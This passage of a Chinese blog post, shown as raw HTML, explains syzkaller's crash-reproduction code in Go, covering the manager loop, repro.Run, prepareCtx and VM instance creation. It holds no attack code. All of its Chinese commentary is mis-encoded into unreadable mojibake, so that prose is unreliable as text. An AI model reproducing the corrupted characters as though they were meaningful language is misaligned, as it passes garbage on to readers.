class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å…ˆè¾“å‡ºä¸€æ®µæ—¥å¿—ï¼Œéšåå®šä¹‰äº†ä¸€ä¸ªé—­åŒ…å‡½æ•°<code>canRepro</code>ï¼Œè¯¥å‡½æ•°çš„åŠŸèƒ½å°±æ˜¯åˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿè¿›è¡Œ<code>crash</code>å¤ç°è¿”å›çš„æ˜¯boolç±»å‹ã€‚</p><p>é¦–å…ˆä¼šåˆ¤æ–­å½“å‰é˜¶æ®µæ˜¯å¦å·²ç»è¶…è¿‡äº†<code>phaseTriagedHub</code>é˜¶æ®µï¼Œéšååˆ¤æ–­<code>reproQueue</code>ä¹Ÿå°±æ˜¯å¤ç°é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼Œæœ€ååˆ¤æ–­åŠ ä¸Šè¯¥crashåç”¨äºå¤ç°çš„VMæ˜¯å¦å°äºç­‰äº<code>maxReproVMs</code>ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> shutdown != <span class="literal">nil</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> canRepro() &#123;</span><br><span class="line">    vmIndexes := instances.Take(instancesPerRepro)</span><br><span class="line">    <span class="keyword">if</span> vmIndexes == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    last := <span class="built_in">len</span>(reproQueue) - <span class="number">1</span></span><br><span class="line">    crash := reproQueue[last]</span><br><span class="line">    reproQueue[last] = <span class="literal">nil</span></span><br><span class="line">    reproQueue = reproQueue[:last]</span><br><span class="line">    atomic.AddUint32(&amp;mgr.numReproducing, <span class="number">1</span>)</span><br><span class="line">    log.Logf(<span class="number">0</span>, <span class="string">&quot;loop: starting repro of &#x27;%v&#x27; on instances %+v&quot;</span>, crash.Title, vmIndexes)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      reproDone &lt;- mgr.runRepro(crash, vmIndexes, instances.Put)</span><br><span class="line">    &#125;()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> !canRepro() &#123;</span><br><span class="line">    idx := instances.TakeOne()</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: starting instance %v&quot;</span>, *idx)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      crash, err := mgr.runInstance(*idx)</span><br><span class="line">      runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆä¼šåˆ¤æ–­<code>shutdown</code>ï¼Œç„¶åè¿›å…¥é“ä¸¤ä¸ªå°å¾ªç¯ä¸­ã€‚é¦–å…ˆçœ‹ç¬¬ä¸€ä¸ªå°å¾ªç¯ï¼Œæ´—è¡£æ­Œå¾ªç¯çš„è¿›å…¥æ¡ä»¶å°±æ˜¯èƒ½å¤Ÿè¿›è¡Œ<code>crash</code>å¤ç°ã€‚</p><p>è¿™é‡Œé¦–å…ˆä»èµ„æºæ± ä¸­å–å‡ºä¸€ä¸ª<code>vmIndexes</code>ï¼Œå¦‚æœè¿”å›çš„æ˜¯<code>nil</code>åˆ™ç›´æ¥é€€å‡ºå¾ªç¯ã€‚éšåä»<code>reproQueue</code>ä¸­å–å‡ºä¸€ä¸ª<code>crash</code>ï¼Œéšåæ›´æ–°<code>mgr.numReproducing</code>è®¡æ•°ã€‚éšåæ–°å¼€å¯ä¸€ä¸ªå†™æˆè°ƒç”¨<code>mgr.runRepro</code>å¯¹<code>crash</code>è¿›è¡Œå¤ç°ï¼Œå¹¶å°†è¿”å›å€¼è¾“å…¥åˆ°<code>reproDone</code>é˜Ÿåˆ—ä¸­ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">runRepro</span><span class="params">(crash *Crash, vmIndexes []<span class="keyword">int</span>, putInstances <span class="keyword">func</span>(...<span class="keyword">int</span>)</span>) *<span class="title">ReproResult</span></span> &#123;</span><br><span class="line">features := mgr.checkResult.Features</span><br><span class="line">res, stats, err := repro.Run(crash.Output, mgr.cfg, features, mgr.reporter, mgr.vmPool, vmIndexes)</span><br><span class="line">ret := &amp;ReproResult&#123;</span><br><span class="line">instances: vmIndexes,</span><br><span class="line">report0:   crash.Report,</span><br><span class="line">repro:     res,</span><br><span class="line">stats:     stats,</span><br><span class="line">err:       err,</span><br><span class="line">hub:       crash.hub,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; res != <span class="literal">nil</span> &amp;&amp; mgr.cfg.StraceBin != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line"><span class="comment">// We need only one instance to get strace output, release the rest.</span></span><br><span class="line">putInstances(vmIndexes[<span class="number">1</span>:]...)</span><br><span class="line"><span class="keyword">defer</span> putInstances(vmIndexes[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> straceAttempts = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= straceAttempts; i++ &#123;</span><br><span class="line">strace := repro.RunStrace(res, mgr.cfg, mgr.reporter, mgr.vmPool, vmIndexes[<span class="number">0</span>])</span><br><span class="line">sameBug := strace.IsSameBug(res)</span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;strace run attempt %d/%d for &#x27;%s&#x27;: same bug %v, error %v&quot;</span>,</span><br><span class="line">i, straceAttempts, res.Report.Title, sameBug, strace.Error)</span><br><span class="line"><span class="comment">// We only want to save strace output if it resulted in the same bug.</span></span><br><span class="line"><span class="comment">// Otherwise, it will be hard to reproduce on syzbot and will confuse users.</span></span><br><span class="line"><span class="keyword">if</span> sameBug &#123;</span><br><span class="line">ret.strace = strace</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">putInstances(vmIndexes...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦åšçš„äº‹æƒ…å…¶å®å°±æ˜¯ç›´æ¥è°ƒç”¨äº†<code>repro.Run</code>å‡½æ•°ï¼Œå¹¶ä¸”åœ¨åé¢è¿›è¡Œäº†ä¸€ä¸‹æ£€æŸ¥ä¹‹åå°†vmé‡æ–°æ”¾å›èµ„æºæ± ä¸­ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Run</span><span class="params">(crashLog []<span class="keyword">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span></span><br><span class="line"><span class="params"><span class="function">vmPool *vm.Pool, vmIndexes []<span class="keyword">int</span>)</span> <span class="params">(*Result, *Stats, error)</span></span> &#123;</span><br><span class="line">ctx, err := prepareCtx(crashLog, cfg, features, reporter, <span class="built_in">len</span>(vmIndexes))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line">ctx.createInstances(cfg, vmPool)</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">// Prepare VMs in advance.</span></span><br><span class="line"><span class="keyword">for</span> _, idx := <span class="keyword">range</span> vmIndexes &#123;</span><br><span class="line">ctx.bootRequests &lt;- idx</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Wait until all VMs are really released.</span></span><br><span class="line"><span class="keyword">defer</span> wg.Wait()</span><br><span class="line"><span class="keyword">return</span> ctx.run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œé¦–å…ˆè°ƒç”¨äº†<code>prepareCtx</code>å‡½æ•°ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prepareCtx</span><span class="params">(crashLog []<span class="keyword">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span></span><br><span class="line"><span class="params"><span class="function">VMs <span class="keyword">int</span>)</span> <span class="params">(*context, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> VMs == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;no VMs provided&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">entries := cfg.Target.ParseLog(crashLog)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(entries) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, ErrNoPrograms</span><br><span class="line">&#125;</span><br><span class="line">crashStart := <span class="built_in">len</span>(crashLog)</span><br><span class="line">crashTitle, crashType := <span class="string">&quot;&quot;</span>, crash.UnknownType</span><br><span class="line"><span class="keyword">if</span> rep := reporter.Parse(crashLog); rep != <span class="literal">nil</span> &#123;</span><br><span class="line">crashStart = rep.StartPos</span><br><span class="line">crashTitle = rep.Title</span><br><span class="line">crashType = rep.Type</span><br><span class="line">&#125;</span><br><span class="line">testTimeouts := []time.Duration&#123;</span><br><span class="line"><span class="number">3</span> * cfg.Timeouts.Program, <span class="comment">// to catch simpler crashes (i.e. no races and no hangs)</span></span><br><span class="line"><span class="number">20</span> * cfg.Timeouts.Program,</span><br><span class="line">cfg.Timeouts.NoOutputRunningTime, <span class="comment">// to catch &quot;no output&quot;, races and hangs</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> crashTitle == <span class="string">&quot;&quot;</span>:</span><br><span class="line">crashTitle = <span class="string">&quot;no output/lost connection&quot;</span></span><br><span class="line"><span class="comment">// Lost connection can be detected faster,</span></span><br><span class="line"><span class="comment">// but theoretically if it&#x27;s caused by a race it may need the largest timeout.</span></span><br><span class="line"><span class="comment">// No output can only be reproduced with the max timeout.</span></span><br><span class="line"><span class="comment">// As a compromise we use the smallest and the largest timeouts.</span></span><br><span class="line">testTimeouts = []time.Duration&#123;testTimeouts[<span class="number">0</span>], testTimeouts[<span class="number">2</span>]&#125;</span><br><span class="line"><span class="keyword">case</span> crashType == crash.MemoryLeak:</span><br><span class="line"><span class="comment">// Memory leaks can&#x27;t be detected quickly because of expensive setup and scanning.</span></span><br><span class="line">testTimeouts = testTimeouts[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">case</span> crashType == crash.Hang:</span><br><span class="line">testTimeouts = testTimeouts[<span class="number">2</span>:]</span><br><span class="line">&#125;</span><br><span class="line">ctx := &amp;context&#123;</span><br><span class="line">target:       cfg.SysTarget,</span><br><span class="line">reporter:     reporter,</span><br><span class="line">crashTitle:   crashTitle,</span><br><span class="line">crashType:    crashType,</span><br><span class="line">crashStart:   crashStart,</span><br><span class="line">entries:      entries,</span><br><span class="line">instances:    <span class="built_in">make</span>(<span class="keyword">chan</span> *reproInstance, VMs),</span><br><span class="line">bootRequests: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, VMs),</span><br><span class="line">testTimeouts: testTimeouts,</span><br><span class="line">startOpts:    createStartOptions(cfg, features, crashType),</span><br><span class="line">stats:        <span class="built_in">new</span>(Stats),</span><br><span class="line">timeouts:     cfg.Timeouts,</span><br><span class="line">&#125;</span><br><span class="line">ctx.reproLogf(<span class="number">0</span>, <span class="string">&quot;%v programs, %v VMs, timeouts %v&quot;</span>, <span class="built_in">len</span>(entries), VMs, testTimeouts)</span><br><span class="line"><span class="keyword">return</span> ctx, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°å†…éƒ¨ä¸»è¦åšçš„äº‹å°±æ˜¯ä¸€äº›æ£€æµ‹ç„¶ååˆå§‹åŒ–ctxï¼Œå‡½æ•°ç»“æŸä¹‹åå®šä¹‰å¯ä¸€ä¸ª<code>sync.WaitGroup</code>ç±»å‹çš„å˜é‡ã€‚éšååˆ›å»ºä¸€ä¸ªæ–°çš„åç¨‹è°ƒç”¨<code>ctx.createInstances</code>å‡½æ•°ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *context)</span> <span class="title">createInstances</span><span class="params">(cfg *mgrconfig.Config, vmPool *vm.Pool)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> vmIndex := <span class="keyword">range</span> ctx.bootRequests &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line">vmIndex := vmIndex</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> inst *instance.ExecProgInstance</span><br><span class="line">maxTry := <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> try := <span class="number">0</span>; try &lt; maxTry; try++ &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-vm.Shutdown:</span><br><span class="line">try = maxTry</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">inst, err = instance.CreateExecProgInstance(vmPool, vmIndex, cfg,</span><br><span class="line">ctx.reporter, &amp;instance.OptionalConfig&#123;Logf: ctx.reproLogf&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">0</span>, <span class="string">&quot;failed to init instance: %v, attempt %d/%d&quot;</span>,</span><br><span class="line">err, try+<span class="number">1</span>, maxTry)</span><br><span class="line">time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> inst != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.instances &lt;- &amp;reproInstance&#123;execProg: inst, index: vmIndex&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line"><span class="comment">// Clean up.</span></span><br><span class="line"><span class="built_in">close</span>(ctx.instances)</span><br><span class="line"><span class="keyword">for</span> inst := <span class="keyword">range</span> ctx.instances &#123;</span><br><span class="line">inst.execProg.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°ä¸­ï¼Œå¾ªç¯è·å–<code>vmIndex</code>ï¼Œå¹¶ä¸”å¼€å¯æ–°çš„åç¨‹ï¼Œåœ¨æ–°çš„åç¨‹ä¸­è°ƒç”¨<code>instance.CreateExecProgInstance</code>å‡½æ•°åˆ›å»ºVMå¹¶æ‹·è´<code>crash</code>ç¨‹åºï¼Œå¦‚æœå¤±è´¥åˆ™ä¼‘çœ åç§’å¦‚æœæˆåŠŸåˆ™å°†ç»“æœè¾“å‡ºåˆ°<code>ctx.instances</code>ä¸­ï¼Œè¿™é‡Œçš„æœ€å¤šå°è¯•æ¬¡æ•°ä¸º<code>maxTry</code>ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CreateExecProgInstance</span><span class="params">(vmPool *vm.Pool, vmIndex <span class="keyword">int</span>, mgrCfg *mgrconfig.Config,</span></span></span><br><span class="line"><span class="params"><span class="function">reporter *report.Reporter, opt *OptionalConfig)</span> <span class="params">(*ExecProgInstance, error)</span></span> &#123;</span><br><span class="line">vmInst, err := vmPool.Create(vmIndex)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to create VM: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">ret, err := SetupExecProg(vmInst, mgrCfg, reporter, opt)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">vmInst.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>CreateExecProgInstance</code>å‡½æ•°çš„å®ç°å°±æ˜¯é€šè¿‡<code>vmPool.Create</code>åˆ›å»ºå¯åŠ¨è™šæ‹Ÿæœºä¹‹åè°ƒç”¨<code>SetupExecProg</code>å‡½æ•°æ‹·è´è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *context)</span> <span class="title">run</span><span class="params">()</span> <span class="params">(*Result, *Stats, error)</span></span> &#123;</span><br><span class="line"><span class="comment">// Indicate that we no longer need VMs.</span></span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(ctx.bootRequests)</span><br><span class="line"></span><br><span class="line">res, err := ctx.repro()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> res != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;repro crashed as (corrupted=%v):\n%s&quot;</span>,</span><br><span class="line">ctx.report.Corrupted, ctx.report.Report)</span><br><span class="line"><span class="comment">// Try to rerun the repro if the report is corrupted.</span></span><br><span class="line"><span class="keyword">for</span> attempts := <span class="number">0</span>; ctx.report.Corrupted &amp;&amp; attempts &lt; <span class="number">3</span>; attempts++ &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;report is corrupted, running repro again&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> res.CRepro &#123;</span><br><span class="line">_, err = ctx.testCProg(res.Prog, res.Duration, res.Opts)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">_, err = ctx.testProg(res.Prog, res.Duration, res.Opts)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;final repro crashed as (corrupted=%v):\n%s&quot;</span>,</span><br><span class="line">ctx.report.Corrupted, ctx.report.Report)</span><br><span class="line">res.Report = ctx.report</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res, ctx.stats, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å›åˆ°å‰é¢çš„<code>RUN</code>å‡½æ•°ï¼Œæœ€åä¼šè°ƒç”¨åˆ°<code>ctx.run()</code>ï¼Œè¿›å…¥åˆ°ä¸Šé¢çš„è¿™ä¸ªå‡½æ•°ä¸­ï¼Œè€Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­åˆ™æ˜¯è°ƒç”¨<code>ctx.repro()</code>æ­£å¼è¿›è¡Œå¤ç°çš„ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *context)</span> <span class="title">repro</span><span class="params">()</span> <span class="params">(*Result, error)</span></span> &#123;</span><br><span class="line"><span class="comment">// Cut programs that were executed after crash.</span></span><br><span class="line"><span class="keyword">for</span> i, ent := <span class="keyword">range</span> ctx.entries &#123;</span><br><span class="line"><span class="keyword">if</span> ent.Start &gt; ctx.crashStart &#123;</span><br><span class="line">ctx.entries = ctx.entries[:i]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reproStart := time.Now()</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;reproducing took %s&quot;</span>, time.Since(reproStart))</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">res, err := ctx.extractProg(ctx.entries)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> res == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> res != <span class="literal">nil</span> &#123;</span><br><span class="line">res.Opts.Repro = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">res, err = ctx.minimizeProg(res)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try extracting C repro without simplifying options first.</span></span><br><span class="line">res, err = ctx.extractC(res)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simplify options and try extracting C repro.</span></span><br><span class="line"><span class="keyword">if</span> !res.CRepro &#123;</span><br><span class="line">res, err = ctx.simplifyProg(res)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simplify C related options.</span></span><br><span class="line"><span class="keyword">if</span> res.CRepro &#123;</span><br><span class="line">res, err = ctx.simplifyC(res)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, 